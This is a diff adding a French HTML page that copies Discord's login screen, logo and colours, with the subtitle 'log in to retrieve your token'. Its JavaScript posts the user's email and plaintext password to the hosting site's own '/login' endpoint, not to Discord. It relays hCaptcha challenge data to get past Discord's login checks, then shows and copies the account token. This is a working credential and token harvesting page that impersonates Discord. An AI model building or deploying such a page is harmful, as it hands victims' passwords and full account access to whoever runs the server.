@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Discord - Connexion</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            background: #313338; color: #dbdee1;
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh; display: flex; align-items: center; justify-content: center;
+            padding: 16px;
+        }
+        .login-card {
+            background: #1e1f22; border-radius: 12px;
+            padding: 32px 24px; width: 100%; max-width: 400px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+        }
+        .logo { text-align: center; margin-bottom: 24px; }
+        .logo svg { width: 40px; height: 40px; }
+        .logo h1 { font-size: 1.1rem; font-weight: 600; margin-top: 8px; color: #fff; }
+        .logo p { font-size: 0.75rem; color: #b5bac1; margin-top: 4px; }
+        .field { margin-bottom: 16px; }
+        .field label {
+            display: block; font-size: 0.7rem; font-weight: 700;
+            color: #b5bac1; margin-bottom: 6px; text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .field input {
+            width: 100%; padding: 10px 12px;
+            background: #1e1f22; border: 1px solid #3f4147;
+            border-radius: 6px; color: #dbdee1;
+            font-family: 'Inter', sans-serif; font-size: 0.9rem;
+            outline: none; transition: border-color .2s;
+        }
+        .field input:focus { border-color: #5865f2; }
+        .btn {
+            width: 100%; padding: 12px; margin-top: 8px;
+            background: #5865f2; color: #fff; border: none;
+            border-radius: 6px; font-family: 'Inter', sans-serif;
+            font-size: 0.9rem; font-weight: 500; cursor: pointer;
+            transition: background .2s;
+        }
+        .btn:hover { background: #4752c4; }
+        .btn:disabled { opacity: .6; cursor: not-allowed; }
+        .error { color: #f23f42; font-size: 0.8rem; text-align: center; margin-top: 10px; display: none; }
+        .loader { height: 3px; background: #2b2d31; border-radius: 3px; overflow: hidden; margin: 12px 0; display: none; }
+        .loader-bar { height: 100%; width: 40%; background: #5865f2; border-radius: 3px; animation: load 1.2s ease infinite; }
+        @keyframes load { 0% { transform: translateX(-100%); } 100% { transform: translateX(350%); } }
+        .result { display: none; }
+        .result .token-box {
+            background: #111214; border: 1px solid #3f4147;
+            border-radius: 6px; padding: 12px; margin-top: 16px;
+            word-break: break-all; font-family: monospace; font-size: 0.75rem;
+            color: #00ff80;
+        }
+        .result .token-label { font-size: 0.65rem; color: #b5bac1; text-transform: uppercase; margin-bottom: 4px; }
+        .result .copy-btn {
+            width: 100%; padding: 10px; margin-top: 10px;
+            background: #23a55a; color: #fff; border: none;
+            border-radius: 6px; font-family: 'Inter', sans-serif;
+            font-size: 0.85rem; font-weight: 500; cursor: pointer;
+        }
+        .result .copy-btn:hover { background: #1a8a48; }
+        .captcha-wrap { margin: 12px 0; display: none; }
+        .captcha-wrap .h-captcha { transform-origin: 0 0; }
+        .alt-link {
+            text-align: center; margin-top: 14px; font-size: 0.75rem;
+        }
+        .alt-link a { color: #00a8fc; text-decoration: none; }
+        .alt-link a:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+<div class="login-card">
+    <div class="logo">
+        <svg viewBox="0 0 40 40"><path fill="#5865f2" d="M36.3 7.3a33.7 33.7 0 0 0-13.3-4.1c-.6 1-1.1 2.2-1.5 3.3a31.3 31.3 0 0 0-9.3 0C11.6 5.4 11 4.3 10.5 3.2A33.7 33.7 0 0 0-2.9 7.3c-5.7 11.6-8.1 23-7.2 34.2a33.9 33.9 0 0 0 14.2 7.2c1.1-1.6 2.1-3.2 3-4.9a22.5 22.5 0 0 1-4.7-2.3l1.1-.9c2.4 1.8 5 3.3 7.7 4.3a22.8 22.8 0 0 0 14 0c2.7-1 5.2-2.5 7.7-4.3l1.1.9a22.5 22.5 0 0 1-4.7 2.3c.9 1.7 1.8 3.3 3 4.9a33.9 33.9 0 0 0 14.2-7.2c1-12.8-1.7-24.2-7.3-34.2zM14.4 31.6c-2.6 0-4.7-2.9-4.7-6.5s2.1-6.5 4.7-6.5 4.8 2.9 4.7 6.5-2 6.5-4.7 6.5zm11.6 0c-2.6 0-4.7-2.9-4.7-6.5s2.1-6.5 4.7-6.5 4.8 2.9 4.7 6.5-2 6.5-4.7 6.5z"/></svg>
+        <h1>Bienvenue</h1>
+        <p>Connecte-toi pour récupérer ton token</p>
+    </div>
+
+    <div id="loginForm">
+        <div class="field">
+            <label>Email ou numéro de téléphone</label>
+            <input type="text" id="email" placeholder="email@exemple.com" autocomplete="email">
+        </div>
+        <div class="field">
+            <label>Mot de passe</label>
+            <input type="password" id="password" placeholder="Mot de passe" autocomplete="current-password">
+        </div>
+        <div class="loader" id="loader"><div class="loader-bar"></div></div>
+        <div class="error" id="error"></div>
+
+        <div class="captcha-wrap" id="captchaWrap">
+            <div id="hCaptchaContainer"></div>
+            <button class="btn" id="captchaBtn" style="display:none;" onclick="submitCaptcha()">Continuer</button>
+        </div>
+
+        <button class="btn" id="loginBtn" onclick="doLogin()">Se connecter</button>
+    </div>
+
+    <div class="result" id="result">
+        <div class="token-label">Token Discord</div>
+        <div class="token-box" id="tokenValue"></div>
+        <button class="copy-btn" onclick="copyToken()">Copier le token</button>
+        <div class="alt-link"><a href="/">Retour à l'accueil</a></div>
+    </div>
+</div>
+
+<script>
+let currentCaptchaRqdata = '';
+let currentCaptchaRqtoken = '';
+let currentEmail = '';
+let currentPassword = '';
+
+function showError(msg) {
+    const e = document.getElementById('error');
+    e.textContent = msg; e.style.display = 'block';
+}
+function hideError() { document.getElementById('error').style.display = 'none'; }
+function setLoading(on) {
+    document.getElementById('loader').style.display = on ? 'block' : 'none';
+    document.getElementById('loginBtn').disabled = on;
+}
+
+async function doLogin() {
+    hideError();
+    const email = document.getElementById('email').value.trim();
+    const pass = document.getElementById('password').value;
+    if (!email || !pass) { showError('Email et mot de passe requis'); return; }
+    currentEmail = email; currentPassword = pass;
+    setLoading(true);
+    try {
+        const r = await fetch('/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ login: email, password: pass })
+        });
+        const d = await r.json();
+        if (d.token) { showToken(d.token); }
+        else if (d.mfa && d.ticket) {
+            showError('2FA requis. Utilise le bouton "Se connecter avec Discord" (OAuth2) ou reviens plus tard.');
+        }
+        else if (d.captcha_key && d.captcha_sitekey) {
+            currentCaptchaRqdata = d.captcha_rqdata || '';
+            currentCaptchaRqtoken = d.captcha_rqtoken || '';
+            showCaptcha(d.captcha_sitekey);
+        }
+        else if (d.message) { showError(d.message); }
+        else { showError('Erreur inconnue'); }
+    } catch(err) { showError('Erreur: ' + err.message); }
+    setLoading(false);
+}
+
+function showCaptcha(sitekey) {
+    document.getElementById('captchaWrap').style.display = 'block';
+    document.getElementById('loginBtn').style.display = 'none';
+    const c = document.getElementById('hCaptchaContainer');
+    c.innerHTML = '';
+    window._captchaCb = function(t) {
+        document.getElementById('captchaBtn').style.display = 'block';
+        document.getElementById('captchaBtn').dataset.token = t;
+    };
+    if (window.hcaptcha) {
+        window.hcaptcha.render(c, { sitekey, callback: '_captchaCb' });
+    } else {
+        const s = document.createElement('script');
+        s.src = 'https://js.hcaptcha.com/1/api.js?render=explicit&onload=_hcaptchaLoaded';
+        s.async = s.defer = true;
+        window._hcaptchaLoaded = () => window.hcaptcha.render(c, { sitekey, callback: '_captchaCb' });
+        document.head.appendChild(s);
+    }
+}
+
+async function submitCaptcha() {
+    const btn = document.getElementById('captchaBtn');
+    const t = btn.dataset.token;
+    if (!t) return;
+    setLoading(true);
+    const body = { login: currentEmail, password: currentPassword, captcha_key: t };
+    if (currentCaptchaRqdata) body.captcha_rqdata = currentCaptchaRqdata;
+    if (currentCaptchaRqtoken) body.captcha_rqtoken = currentCaptchaRqtoken;
+    try {
+        const r = await fetch('/login', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(body)
+        });
+        const d = await r.json();
+        if (d.token) { showToken(d.token); }
+        else if (d.captcha_key && d.captcha_sitekey) {
+            currentCaptchaRqdata = d.captcha_rqdata || '';
+            currentCaptchaRqtoken = d.captcha_rqtoken || '';
+            document.getElementById('hCaptchaContainer').innerHTML = '';
+            showCaptcha(d.captcha_sitekey);
+            showError('Nouveau captcha requis. Résous-le.');
+        }
+        else if (d.mfa && d.ticket) { showError('2FA requis. OAuth2 nécessaire.'); }
+        else if (d.message) { showError(d.message); }
+        else { showError('Erreur'); }
+    } catch(err) { showError('Erreur: ' + err.message); }
+    setLoading(false);
+}
+
+function showToken(t) {
+    document.getElementById('loginForm').style.display = 'none';
+    document.getElementById('tokenValue').textContent = t;
+    document.getElementById('result').style.display = 'block';
+}
+
+function copyToken() {
+    const t = document.getElementById('tokenValue').textContent;
+    navigator.clipboard.writeText(t).then(() => {
+        document.querySelector('.copy-btn').textContent = 'Copié ! ✓';
+    }).catch(() => {
+        const ta = document.createElement('textarea');
+        ta.value = t; ta.style.position = 'fixed'; ta.style.left = '-9999px';
+        document.body.appendChild(ta); ta.select();
+        document.execCommand('copy'); document.body.removeChild(ta);
+        document.querySelector('.copy-btn').textContent = 'Copié ! ✓';
+    });
+}
+</script>
+</body>
+</html>
